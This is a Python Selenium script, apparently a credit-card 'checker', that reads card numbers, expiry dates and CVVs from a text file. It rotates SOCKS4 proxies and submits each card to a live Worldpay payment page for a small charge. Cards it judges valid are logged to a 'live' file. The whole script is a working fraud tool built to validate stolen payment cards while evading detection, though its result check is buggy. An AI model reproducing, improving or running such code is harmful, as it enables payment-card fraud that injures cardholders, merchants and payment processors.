#!/bin/env python3
# encoding: utf-8

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import random
import time

def random_proxy():
    rdm = random.randrange(len(lista_proxy) - 1)
    proxy = lista_proxy[rdm].split(":")
    return proxy

lista_proxy = open('proxy[T].txt', 'r').readlines()
lista_proxy = [linha_proxy.replace("\n", "") for linha_proxy in lista_proxy]

lista_cc = open('cc.txt', 'r').readlines()
lista_cc = [linha_cc.replace("\n", "") for linha_cc in lista_cc]

url = "https://secure.worldpay.com/wcc/purchase?instId=286005&testMode=0&cartId=1&currency=GBP&amount=0.01"
chrome_options = Options()
chrome_options.add_argument("--headless")

for num in range(1, len(lista_cc) - 1):
    for cc in lista_cc:
        cc = cc.split("|")
        n = cc[0]
        mes = cc[1]
        ano = cc[2]
        cvv = cc[3]
        #print(n[0])
        #print(type(n[0]))
        #print(n, mes, ano, cvv)

        proxy = random_proxy()

        while True:
            try:
                chrome_options.add_argument("--proxy-server=socks4://" + proxy[0] + ":" + proxy[1])
                driver = webdriver.Chrome(chrome_options=chrome_options, executable_path="C:\\tool\chromedriver.exe")
                driver.set_page_load_timeout(10)
                driver.get(url)
                break
            except:
                proxy = random_proxy()
                continue

        while True:
            try:
                if n[0]=="5":
                    driver.find_element_by_name("op-DPChoose-ECMC^SSL").click()
                    break
                elif n[0]=="4":
                    driver.find_element_by_name("op-DPChoose-VISA^SSL").click()
                    break
                else:
                    num += 1
                    continue
            except:
                num +=1
                continue

        try:
            driver.find_element_by_id("cardNoInput").send_keys(n)
            driver.find_element_by_id("cardCVV").send_keys(cvv)
            driver.find_element_by_xpath("//option[@value="+mes+"]").click()
            driver.find_element_by_xpath("//option[@value="+ano+"]").click()
            driver.find_element_by_id("name").send_keys("Cesar P Drumond")
            driver.find_element_by_id("address1").send_keys("Cesar P Drumond")
            driver.find_element_by_id("town").send_keys("Cesar P Drumond")
            driver.find_element_by_id("postcode").send_keys("Cesar P Drumond")
            driver.find_element_by_xpath("//option[@value='US']").click()
            driver.find_element_by_id("email").send_keys("cesarpietrodrumond@gmail.com.br")
            driver.find_element_by_id("op-PMMakePayment").click()
            resp = driver.find_element_by_xpath("//li").text
        except:
            num += 1
            continue

        resp = resp.replace("\n", "")
        driver.close()
        #print(resp)
        if "inválido" or "recusada" in resp:
            print(str(num)+ ' ' + n + "|" + mes + "|" + ano + "|" + cvv + ' ' + resp + ' ' + proxy[0] + ":" + proxy[1])
        else:
            print('\n' + "-" * 25)
            print("cc válida : %s|%s|%s|%s" %(n ,mes, ano, cvv))
            print("-"* 25 + '\n')
            live = open('live.txt', 'a+')
            live.writelines("LIVE => " + n + "|" + mes + "|" + ano + "|" + cvv)
            live.close()
        num += 1

    print("[+] Finalizado !")
